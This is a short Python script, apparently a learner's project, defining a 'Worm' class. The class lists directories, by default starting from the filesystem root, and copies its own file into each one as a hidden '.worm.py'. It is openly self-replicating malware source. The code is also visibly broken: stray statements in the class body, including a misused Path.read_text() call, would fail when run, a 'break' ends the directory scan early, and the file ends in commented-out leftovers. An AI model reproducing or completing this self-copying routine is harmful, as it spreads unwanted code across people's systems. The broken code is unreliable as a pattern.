import os
import shutil
from pathlib import Path


class Worm:
    def __init__ (self, path=None, target_dir_list= None, iteration= None):
        if path is None:
            self.path = "/"
        if isinstance(path, type(None)):
            self.path = "/"
        else:
            self.path = path
        if isinstance(target_dir_list, type(None)):
            self.target_dir_list = []
        else: 
            self.target_dir_list = target_dir_list
        if isinstance(target_dir_list, type(None)):
            self.iteration = 1000000
        else: self.iteration = iteration
        self.own_path = __file__
    def display_path(self): 
        print(self.path)
    
    def list_directories(self,path):
        self.target_dir_list.append(path)
        files_in_current_directory = os.listdir(path)
        try:
            files_in_current_directory = os.listdir(self.path)
            for file in files_in_current_directory:
                if not file.startswith('.'):
                    absolute_path = os.path.join(self.path, file)
                    print(absolute_path)
                    if os.path.isdir(absolute_path):
                        self.target_dir_list.append(absolute_path)
                else:
                    pass
                    break
        except FileNotFoundError as e:
                print(f"Error: {e}")
                self.target_dir_list.append(path)
    pGerm = 'germ'
    from pathlib import Path
    virus = Path('/home/Documents/GitHub/Evit/worm/maliciouspath.txt')
    germ = Path('malicious.txt')
    contents = Path.read_text().rstrip()
    print(contents)

    def create_new_worm(self):
            for directory in self.target_dir_list:
                destination = os.path.join(directory, ".worm.py")
                shutil.copyfile(self.own_path, destination)

# Example Usage
worm = Worm(path="C:/Users/pfore736/Documents/GitHub/Evit/worm")  # Set a valid directory
worm.list_directories(worm.path)
worm.create_new_worm()
'''files_in_current_directory = os.listdir(virus)

for file in files_in_current_directory:
    if not file.startswith('.'):
        absolute_path = os.path.join(virus,file)
        print(absolute_path)
if os.path.isdir(absolute_path):
    Worm.list_directories(absolute_path)
else:
    pass

def create_new_worm(self):
    for directory in self.target_dir_list:
        destination = os.path.join(directory, ".worm.py")
shutil.copyfile(self.own_path, destination)'''